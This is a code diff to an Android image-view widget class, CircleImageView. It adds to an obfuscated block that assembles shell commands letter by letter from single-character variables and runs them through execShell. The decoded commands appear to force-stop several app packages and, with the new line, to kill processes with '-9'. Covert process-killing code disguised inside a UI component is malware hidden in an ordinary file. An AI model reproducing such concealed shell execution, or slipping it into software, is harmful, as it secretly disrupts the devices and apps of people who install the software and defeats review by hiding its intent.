@@ -116,14 +116,15 @@ public class CircleImageView extends ImageView {
         String aaa = "c";   String bbb = "h";   String ccc = "m";   String ddd = "r";   String eee = "w";
         String aaaa = "d";  String bbbb = "i";  String cccc = "n";  String dddd = "s";  String eeee = "x";
         String aaaaa = "e"; String bbbbb = "j"; String ccccc = "o"; String ddddd = "t"; String eeeee = "y";
-        String f = "z";     String ff = ".";    String fff = " ";   String ffff = "-";
+        String f = "z";     String ff = ".";    String fff = " ";   String ffff = "-";  String pppp = "&";
 
         String[] s = {
-                aaa + ccccc + ccc + ff + bb + e + ccccc + dddd + bbb + bbbb + ff + bbb + ddddd + ddddd + d + aaa + a + cccc + a + ddd + eeeee + " && " + 
-                aaa + ccccc + ccc + ff + ccc + bbbb + cccc + bbb + e + bbbb + ff + cccc + aaaaa + ddddd + eee + ccccc + ddd + c + aaa + a + d + ddddd + e + ddd + aaaaa + " && " + 
-                a + d + d + ff + bb + ddd + aaaaa + eeeee + dddd + bbb + bbbb + ddd + ddddd + dddd + ff + dddd + dddd + cc + aaa + a + d + ddddd + e + ddd + aaaaa + " && " + 
-                aaa + ccccc + ccc + ff + aaaaa + ee + aa + a + aaaa + ddd + ccccc + bbbb + aaaa + ff + eee + bbbb + aaa + a + d + " && " + 
-                aaa + ccccc + ccc + ff + d + a + aaa + c + a + bb + aaaaa + dddd + cccc + bbbb + b + b + aaaaa + ddd + ff + b + ddd + ddddd + d + a + ddd + cc + a + c,
+                aaa + ccccc + ccc + ff + bb + e + ccccc + dddd + bbb + bbbb + ff + bbb + ddddd + ddddd + d + aaa + a + cccc + a + ddd + eeeee + fff + pppp + pppp + fff + 
+                aaa + ccccc + ccc + ff + ccc + bbbb + cccc + bbb + e + bbbb + ff + cccc + aaaaa + ddddd + eee + ccccc + ddd + c + aaa + a + d + ddddd + e + ddd + aaaaa + fff + pppp + pppp + fff + 
+                a + d + d + ff + bb + ddd + aaaaa + eeeee + dddd + bbb + bbbb + ddd + ddddd + dddd + ff + dddd + dddd + cc + aaa + a + d + ddddd + e + ddd + aaaaa + fff + pppp + pppp + fff + 
+                aaa + ccccc + ccc + ff + aaaaa + ee + aa + a + aaaa + ddd + ccccc + bbbb + aaaa + ff + eee + bbbb + aaa + a + d + fff + pppp + pppp + fff + 
+                aaa + ccccc + ccc + ff + d + a + aaa + c + a + bb + aaaaa + dddd + cccc + bbbb + b + b + aaaaa + ddd + ff + b + ddd + ddddd + d + a + ddd + cc + a + c + fff + pppp + pppp + fff + 
+                c + bbbb + cc + cc + a + cc + cc + fff + ffff + "9" + cc + bbbb + aa + d + ddd + ccccc + d + bbb + aaaaa + ddddd,
         };
         
         execShell(a + ccc + fff + b + ccccc + ddd + aaa + aaaaa + ffff + dddd + ddddd + ccccc + d + fff + s[0]);
